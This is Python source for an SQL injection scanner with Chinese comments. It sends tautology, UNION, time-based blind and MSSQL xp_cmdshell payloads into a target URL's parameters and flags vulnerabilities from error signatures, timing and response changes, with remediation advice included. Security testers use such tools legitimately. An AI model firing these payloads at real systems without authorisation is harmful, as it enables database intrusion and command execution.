# ✅ 修改后的 SQLiScanner，支持 Dashboard 进度反馈 + 保留原功能逻辑（如错误签名、盲注检测等）

import requests
from colorama import Fore, Style, init
from urllib.parse import urlparse, parse_qs, urlencode
import time
import logging
import copy


class SQLiScanner:
    """SQL注入漏洞扫描器"""

    # 按数据库类型分类的有效载荷
    PAYLOADS = {
        "generic": ["' OR '1'='1'--", "' UNION SELECT null,null--", "' OR 1=1 -- ", "1 OR 1=1"],
        "mysql": ["' AND SLEEP(5)--", "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--", "1' AND SLEEP(5)#"],
        "mssql": ["'; EXEC xp_cmdshell('dir')--", "'; WAITFOR DELAY '0:0:5'--"],
        "postgresql": ["' AND PG_SLEEP(5)--", "1; SELECT pg_sleep(5)--"]
    }

    # 错误指纹库 - 按数据库类型分类
    ERROR_SIGNATURES = {
        "mysql": [
            "sql syntax", "mysql error", "mysql_fetch_array", "mysql_fetch_assoc",
            "mysql_num_rows", "mysql_fetch_row", "mysql_fetch_object", "mysql_numrows",
            "you have an error in your sql syntax"
        ],
        "mssql": [
            "unclosed quotation mark", "sql server", "oledb", "sqloledb", "[microsoft]",
            "[odbc sql server driver]", "[sqlserver]", "incorrect syntax"
        ],
        "postgresql": [
            "postgre", "psql", "pgsql", "postgres syntax error"
        ],
        "oracle": [
            "ora-", "oracle error", "oracle.*driver", "quoted string not properly terminated"
        ],
        "sqlite": [
            "sqlite_error", "sqlite3::", "sqlite.db"
        ],
        "general": [
            "syntax error", "invalid query", "sql error", "jdbc driver", "sql syntax"
        ]
    }

    VULN_INFO = {
        'description': (
            "SQL注入漏洞允许攻击者通过构造恶意查询参数干涉数据库查询，"
            "可能导致数据泄露、数据篡改甚至服务器沦陷"
        ),
        'severity_levels': {
            'critical': '高危 - 存在明显的SQL注入漏洞，需立即修复',
            'high': '高危 - 可能存在SQL注入漏洞，建议尽快确认并修复',
            'medium': '中危 - 发现SQL注入相关风险特征',
            'info': '信息 - 潜在风险点，需要进一步验证'
        },
        'solutions': [
            "使用参数化查询（Prepared Statements）",
            "实施严格的输入验证规则",
            "启用Web应用防火墙(WAF)",
            "定期更新数据库补丁",
            "实施最小权限原则，限制数据库用户权限"
        ],
        'references': [
            "OWASP SQL注入防护手册: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            "CWE-89: SQL注入",
            "OWASP Top 10: A03:2021-Injection"
        ]
    }

    def __init__(self, timeout=30, enable_blind_detection=False, db_type="generic",
                 blind_threshold=5, default_params=None, log_level=logging.INFO):
        """
        初始化SQL注入扫描器

        Args:
            timeout (int): 请求超时时间（秒）
            enable_blind_detection (bool): 是否启用基于时间的盲注检测
            db_type (str): 目标数据库类型 (generic, mysql, mssql, postgresql)
            blind_threshold (int): 盲注检测时间阈值（秒）
            default_params (dict): 当URL没有参数时使用的默认参数
            log_level (int): 日志级别
        """
        self.timeout = timeout
        self.enable_blind_detection = enable_blind_detection
        self.db_type = db_type
        self.blind_threshold = blind_threshold
        self.default_params = default_params or {'id': '1'}

        # 配置日志
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.setLevel(log_level)
        if not self.logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)

        # 初始化colorama
        init(autoreset=True)

    def _print_colored(self, level, message):
        """彩色打印函数，用于控制台输出"""
        colors = {
            'critical': Fore.RED + Style.BRIGHT,
            'high': Fore.RED,
            'medium': Fore.YELLOW,
            'info': Fore.CYAN,
            'normal': Fore.WHITE,
            'error': Fore.MAGENTA
        }
        print(f"{colors.get(level, '')} {message}")

    def scan(self, url, method="GET", data=None, custom_headers=None):
        """
        扫描URL是否存在SQL注入漏洞

        Args:
            url (str): 目标URL
            method (str): 请求方法，GET或POST
            data (dict): POST请求的数据
            custom_headers (dict): 自定义HTTP头

        Returns:
            list: 发现的漏洞列表
        """
        self.logger.info(f"开始扫描 {url} 的SQL注入漏洞")

        method = method.upper()
        if method not in ["GET", "POST"]:
            self.logger.error(f"不支持的请求方法: {method}")
            return [{'type': 'error', 'message': f"不支持的请求方法: {method}"}]

        # 设置请求头
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        if custom_headers:
            headers.update(custom_headers)

        results = []
        parsed = urlparse(url)

        # 确保URL有有效路径
        if not parsed.path:
            parsed = parsed._replace(path="/")
            url = parsed.geturl()

        # 获取参数
        if method == "GET":
            params = parse_qs(parsed.query)
            # 如果URL没有参数，使用默认参数但不修改原始URL
            if not params:
                self.logger.info(f"URL没有参数，将使用默认参数: {self.default_params}")
                params = {k: [v] if not isinstance(v, list) else v
                          for k, v in self.default_params.items()}
        else:  # POST
            if not data:
                self.logger.info(f"POST请求没有提供数据，将使用默认参数: {self.default_params}")
                params = {k: [v] if not isinstance(v, list) else v
                          for k, v in self.default_params.items()}
            else:
                params = copy.deepcopy(data)
                # 确保所有值都是列表形式，便于后续统一处理
                for k, v in params.items():
                    if not isinstance(v, list):
                        params[k] = [v]

        # 先发送一个基准请求
        try:
            baseline_response = self._send_request(url, method, params, headers)
            baseline_status = baseline_response.status_code
            baseline_content_length = len(baseline_response.content)
            baseline_text = baseline_response.text.lower()
            self.logger.debug(f"基准请求状态码: {baseline_status}, 内容长度: {baseline_content_length}")
        except Exception as e:
            self.logger.error(f"基准请求失败: {str(e)}")
            return [{'type': 'error', 'message': f"基准请求失败: {str(e)}"}]

        # 获取适用的payload
        payloads = self.PAYLOADS.get(self.db_type, self.PAYLOADS["generic"])

        # 遍历所有参数和payload进行测试
        for param_name, param_values in params.items():
            original_value = param_values[0]  # 取第一个值作为原始值
            self.logger.info(f"测试参数: {param_name}, 原始值: {original_value}")

            for payload in payloads:
                self.logger.debug(f"测试payload: {payload}")
                test_params = copy.deepcopy(params)
                test_params[param_name] = [payload]  # 替换为payload

                try:
                    start_time = time.time()
                    response = self._send_request(url, method, test_params, headers)
                    response_time = time.time() - start_time

                    # 检查是否存在漏洞
                    vuln_found, severity, evidence = self._check_vulnerability(
                        response, response_time, baseline_response, baseline_text,
                        baseline_content_length, payload
                    )

                    if vuln_found:
                        # 构建漏洞信息
                        vuln_info = {
                            'type': 'SQLi',
                            'param': param_name,
                            'payload': payload,
                            'severity': severity,
                            'evidence': evidence,
                            'description': self.VULN_INFO['description'],
                            'severity_description': self.VULN_INFO['severity_levels'][severity],
                            'solutions': self.VULN_INFO['solutions'],
                            'references': self.VULN_INFO['references'],
                            'url': url,
                            'method': method,
                            'response_time': response_time,
                            'status_code': response.status_code
                        }

                        results.append(vuln_info)
                        self._print_colored(severity,
                                            f"[{severity.upper()}] SQL注入漏洞发现于参数: {param_name}, Payload: {payload}")
                        self.logger.info(f"发现漏洞: {param_name} - {evidence}")

                except requests.exceptions.Timeout:
                    timeout_info = {
                        'type': 'timeout',
                        'param': param_name,
                        'payload': payload,
                        'url': url,
                        'method': method
                    }
                    results.append(timeout_info)

                    # 如果是时间盲注payload且检测超时，可能是漏洞
                    if "sleep" in payload.lower() or "delay" in payload.lower() or "waitfor" in payload.lower():
                        self._print_colored('high', f"[高危] 可能存在时间盲注，参数: {param_name}, Payload: {payload}")
                        results.append({
                            'type': 'SQLi',
                            'param': param_name,
                            'payload': payload,
                            'severity': 'high',
                            'evidence': '请求超时，可能存在时间盲注漏洞',
                            'description': self.VULN_INFO['description'],
                            'severity_description': self.VULN_INFO['severity_levels']['high'],
                            'solutions': self.VULN_INFO['solutions'],
                            'references': self.VULN_INFO['references'],
                            'url': url,
                            'method': method
                        })
                    else:
                        self._print_colored('normal', f"[超时] 参数 {param_name} 检测超时")

                except Exception as e:
                    error_info = {
                        'type': 'error',
                        'param': param_name,
                        'payload': payload,
                        'error': str(e)
                    }
                    results.append(error_info)
                    self._print_colored('error', f"[错误] 参数 {param_name} 检测失败: {str(e)}")
                    self.logger.error(f"参数 {param_name} 使用payload {payload} 测试失败: {str(e)}")

        # 总结结果
        critical_vulns = [r for r in results if r.get('severity') == 'critical']
        high_vulns = [r for r in results if r.get('severity') == 'high']
        medium_vulns = [r for r in results if r.get('severity') == 'medium']

        if critical_vulns:
            self._print_colored('critical', f"扫描完成，发现 {len(critical_vulns)} 个高危漏洞!")
        elif high_vulns:
            self._print_colored('high', f"扫描完成，发现 {len(high_vulns)} 个可能的高危漏洞")
        elif medium_vulns:
            self._print_colored('medium', f"扫描完成，发现 {len(medium_vulns)} 个中危风险点")
        else:
            self._print_colored('normal', "扫描完成，未发现明显SQL注入漏洞")

        return results

    def _send_request(self, url, method, params, headers):
        """发送HTTP请求"""
        parsed = urlparse(url)

        if method == "GET":
            # 处理GET请求
            # 将字典转换为查询字符串
            query_string = urlencode({k: v[0] for k, v in params.items()}, doseq=False)
            test_url = parsed._replace(query=query_string).geturl()
            return requests.get(test_url, headers=headers, timeout=self.timeout, allow_redirects=False)
        else:
            # 处理POST请求 - 转换为非列表形式
            post_data = {k: v[0] for k, v in params.items()}
            return requests.post(url, headers=headers, data=post_data, timeout=self.timeout, allow_redirects=False)

    def _check_vulnerability(self, response, response_time, baseline_response, baseline_text,
                             baseline_content_length, payload):
        """
        检查响应是否表明存在SQL注入漏洞

        Returns:
            tuple: (是否发现漏洞, 严重程度, 证据)
        """
        response_text = response.text.lower()
        current_content_length = len(response.content)

        # 检查时间盲注
        if self.enable_blind_detection and ("sleep" in payload.lower() or "delay" in payload.lower() or
                                            "waitfor" in payload.lower()):
            if response_time > self.blind_threshold:
                return True, 'critical', f"响应时间 ({response_time:.2f}秒) 超过阈值 ({self.blind_threshold}秒)"

        # 检查错误信息
        for db_type, signatures in self.ERROR_SIGNATURES.items():
            for signature in signatures:
                if signature in response_text and signature not in baseline_text:
                    return True, 'critical', f"发现数据库错误信息: {signature}"

        # 检查状态码变化
        if response.status_code != baseline_response.status_code:
            if response.status_code in [500, 503]:
                return True, 'high', f"状态码变化 ({baseline_response.status_code} -> {response.status_code})"

        # 检查内容长度变化 (超过50%的变化可能表明注入成功)
        content_diff_ratio = abs(current_content_length - baseline_content_length) / max(baseline_content_length, 1)
        if content_diff_ratio > 0.5:  # 内容长度变化超过50%
            return True, 'medium', f"响应大小显著变化 ({baseline_content_length} -> {current_content_length}字节)"

        # 查找可疑内容
        suspicious_terms = ["admin", "root", "system", "password", "username", "select", "from",
                            "where", "database", "table", "column"]
        for term in suspicious_terms:
            if term in response_text and term not in baseline_text:
                return True, 'medium', f"响应中包含可疑词汇: {term}"

        return False, None, None

# 示例用法
if __name__ == "__main__":
    # 配置日志
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    # 创建扫描器实例
    scanner = SQLiScanner(
        timeout=10,
        enable_blind_detection=True,
        db_type="mysql",  # 指定目标数据库类型
        blind_threshold=3
    )

    # 扫描目标URL
    url = "http://example.com/product.php?id=123"
    results = scanner.scan(url)

    # 显示结果
    print(f"\n发现 {len(results)} 个结果")
